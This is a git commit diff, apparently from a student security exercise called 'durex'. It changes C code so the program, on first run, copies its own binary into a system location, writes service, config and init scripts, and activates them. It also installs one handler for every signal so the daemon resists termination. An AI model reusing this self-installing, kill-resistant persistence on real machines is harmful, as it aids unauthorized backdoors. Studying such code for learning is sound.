a7bf2683f5f17b6a6147f2f4be0eb431d6d2525c
GBO <gbourgeo@student.42.fr>
2018-07-22 12:20:48 +0200

    durex: modified file installation on first use

--- durex/srcs/install.c
+++ durex/srcs/install.c
@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2018/07/15 02:50:10 by root             ###   ########.fr       */
+/*   Updated: 2018/07/22 12:13:10 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,32 +14,74 @@
 #include <stdlib.h>
 /* mmap */
 #include <sys/mman.h>
-
+#include <stdio.h>
 #include "main.h"
 
-void				install_binary(int durex)
+int			install_binary(const char *prog)
 {
-	int				fd;
-	void			*data;
-	int				size;
+	int		durex;
+	int		bin;
+	void	*data;
+	int		size;
 
-	if ((fd = open("./Durex", O_RDONLY)) == -1)
-		return ;
-	if ((size = lseek(fd, 1, SEEK_END)) == -1) {
-		close(fd);
-		return ;
-	}
-	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
-	if (data == MAP_FAILED) {
-		close(fd);
-		return ;
-	}
-	close(fd);
-	write(durex, data, size);
+	bin = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
+	if (bin < 0)
+		return 0;
+	if ((durex = open(prog, O_RDONLY)) == -1)
+		return 1;
+	size = lseek(durex, 1, SEEK_END);
+	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, durex, 0);
+	close(durex);
+	if (size == -1 || data == MAP_FAILED)
+		return 1;
+	write(bin, data, size);
+	close(bin);
 	munmap(data, size);
-	if ((fd = open(DUREX_SCRIPT_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755)) == -1)
-		return ;
-	write(fd, DUREX_SCRIPT, sizeof(DUREX_SCRIPT));
-	system(DUREX_ACTIVATE_SCRIPT);
+	return install_service();
+}
+
+int			install_service()
+{
+	int		fd;
+	size_t	ret;
+	
+	fd = open(DUREX_SERVICE_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
+	if (fd < 0)
+		return 1;
+	ret = write(fd, DUREX_SERVICE_SCRIPT, sizeof(DUREX_SERVICE_SCRIPT));
 	close(fd);
+	if (ret != sizeof(DUREX_SERVICE_SCRIPT))
+		return 1;
+	return install_conf();
+}
+
+int			install_conf()
+{
+	int		fd;
+	size_t	ret;
+	
+	fd = open(DUREX_CONF_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
+	if (fd < 0)
+		return 1;
+	ret = write(fd, DUREX_CONF_SCRIPT, sizeof(DUREX_CONF_SCRIPT));
+	close(fd);
+	if (ret != sizeof(DUREX_CONF_SCRIPT))
+		return 1;
+	return install_init();
+}
+
+int			install_init()
+{
+	int		fd;
+	size_t	ret;
+	
+	fd = open(DUREX_INIT_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0755);
+	if (fd < 0)
+		return 1;
+	ret = write(fd, DUREX_INIT_SCRIPT, sizeof(DUREX_INIT_SCRIPT));
+	close(fd);
+	if (ret != sizeof(DUREX_INIT_SCRIPT))
+		return 1;
+	system(DUREX_ACTIVATE_SCRIPT);
+	return 1;
 }
--- durex/srcs/main.c
+++ durex/srcs/main.c
@@ -6,51 +6,56 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2018/07/20 17:57:28 by root             ###   ########.fr       */
+/*   Updated: 2018/07/22 12:03:54 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-/* getrlimit */
-#include <sys/time.h>
-#include <sys/resource.h>
-/* memset strlen */
-#include <string.h>
 /* signal */
 #include <signal.h>
 /* remove */
 #include <stdio.h>
 /* exit */
 #include <stdlib.h>
+/* getpwuid */
+#include <sys/types.h>
+#include <pwd.h>
 
 #include "main.h"
 
-void			quitClearlyDaemon()
+static void		print_usr_name()
 {
-	flock(e.lock, LOCK_UN);
-	remove(DUREX_LOCK_FILE);
-	close(e.lock);
-	exit(0);
+	struct passwd	*passwd;
+
+	passwd = getpwuid(getuid());
+	write(STDIN_FILENO, passwd->pw_name, strlen(passwd->pw_name));
+	write(STDIN_FILENO, "\n", 1);
 }
 
-int					main()
+int				main(int ac, char **av)
 {
-	/* int				fd; */
-
-	if (getuid() != 0)
+	(void)ac;
+	print_usr_name();
+	if (setuid(getuid()) != 0)
 		return 3;
-	/* if ((fd = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755)) != -1) { */
-	/* 	install_binary(fd); */
-	/* 	close(fd); */
-	/* 	write(STDIN_FILENO, "gbourgeo\n", 9); */
-	/* 	return 0; */
-	/* } */
-	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_EXCL | O_RDWR, 0600);
+	if (install_binary(av[0]))
+		return 3;
+	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_WRONLY, 0600);
 	if (e.lock < 0)
 		return 3;
 	if (flock(e.lock, LOCK_EX | LOCK_NB))
 		return 3;
-	signal(SIGTERM, &durexSigterm);
+	for (int i = 0; i < NSIG; i++) {
+		signal(i, &durexSigterm);
+	}
 	durex();
 	quitClearlyDaemon();
 	return 0;
+}
+
+void			quitClearlyDaemon()
+{
+	flock(e.lock, LOCK_UN);
+	close(e.lock);
+	remove(DUREX_LOCK_FILE);
+	exit(0);
 }
